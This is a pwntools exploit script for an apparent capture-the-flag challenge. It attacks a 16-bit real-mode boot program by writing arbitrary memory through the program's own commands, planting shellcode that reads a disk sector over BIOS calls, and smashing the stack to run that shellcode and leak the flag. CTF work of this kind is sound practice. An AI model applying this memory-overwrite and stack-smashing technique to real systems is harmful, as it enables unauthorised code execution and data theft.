from pwn import *

disk_path = "/tmp/boot.bin"
context.arch = "i386"

# io = process(["qemu-system-i386", "-s", "-display", "none", "-serial", "mon:stdio", disk_path])
if args.REMOTE:
    io = remote("frp.athdesk.me", 11339)
else:
    io = remote("localhost", 1337)

def rl():
    return io.recvuntil(b"\r\n").strip()

def sl(b):
    io.send(b + b"\r")
    # echo
    n = len(b) + 1
    while n > 0:
        n -= len(io.recv(1))


def write_word(what, to):
    # to is an address [0x0000, 0xffff]
    # we have to send an offset from 0x6000, divided by 2
    # because we are writing 2 bytes at a time
    # so we have to send (to - 0x6000) / 2
    slot = ((to - 0x6000) % 0xffff) // 2
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"w {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(cmd)
    io.recvuntil(b"hexword]> ")

    target_val = hex(what)[2:].rjust(4, "0")
    info(f"Sending {target_val} -> {target_slot}")
    sl(target_val.encode())

def read_word(from_):
    slot = ((from_ - 0x6000) % 0xffff) // 2
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"r {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(cmd)
    ss = rl()
    info(f"Reading {target_slot} -> {ss.decode()}")
    return int(ss.decode(), 16)


def write_contiguous(pl, to=0x6000):
    word_list = []
    for i in range(0, len(pl), 2):
        word_list.append(u16(pl[i:i+2]))
    for w in word_list:
        write_word(w, to)
        to += 2

def comm_test():
    io.recvuntil(b"> ")
    sl(b"R 0000")
    ss = rl()
    info(ss.decode())

    io.recvuntil(b"> ")
    sl(b"W 0000")
    io.recvuntil(b"hexword]> ")
    sl(b"dead")

    io.recvuntil(b"> ")
    sl(b"R 0000")
    ss = rl()
    info(ss.decode())
    input()

# This real mode 16-bits shellcode will read the second sector of the disk using BIOS Apis
# https://stanislavs.org/helppc/int_13-2.html

shellcode = """
; org 0x6000
bits 16

nop
nop
nop
nop

mov ah, 2
mov al, 1
mov bx, 0x7080 ; <- target address
mov cx, 0x0002     ; <- cyl:sector
mov dx, 0x0080    ; <- head:disk number ( or 0x80 to indicate hdd and not floppy)
int 0x13

mov bx, 0x7080
loop:
    mov al, [bx]
    mov dx, 0x3f8 ; putc(al)
    out dx, al
    inc bx
    cmp bx, 0x70b0
        jne loop


hlt
"""

open("shellcode.S", "w").write(shellcode)
info("Assembling shellcode...")
os.system("nasm -f bin shellcode.S -o /tmp/payload")
payload = open("/tmp/payload", "rb").read()
write_contiguous(payload, to=0x5b00) # shellcode starts at 0x5b00, so we can reuse `005b` from `417c005b`
                                     # which is `inc cx; jl $+2 (nop); pop bx`

# execute the shellcode by doing a stack overflow into code
# writing a jump to our shellcode, while keeping in mind that
# `main`'s address is pushed alongside a word controlled by us, every single time
# we trigger it by calling `putc`

npush = 0

def push(word):
    global npush
    slot = ((word - 0x6000) % 0xffff) // 2
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"X {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(cmd)
    rl()
    info(f"Smashing.... {hex(0x8000 - (npush*4))} -> {hex(word)}")
    npush += 1

def pushslot(slot):
    global npush
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"X {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(cmd)
    rl()
    info(f"Smashing.... {hex(0x8000 - (npush*4))} -> SLOT {hex(slot)}")
    npush += 1



STACK = 0x8000


for i in range(134):
    pushslot(0x0)

# on top of our junk, 32 bytes are also clobbered with something
# but instructions are instructions generally
# segfault? what segfault? we're in real mode baby

# now we can shellcode using 1-byte instructions, and only using words that are even :skull:
# but we can do some magic to get around that (jump to an odd address using the high byte (argument to a `jl` instruction))

# push(0x0058); # pop ax

# push(0x0)

io.recvuntil(b"> ")
io.send(b"AAAA\r")

flag = io.recv()
info(f"Flag: {flag}")

input()
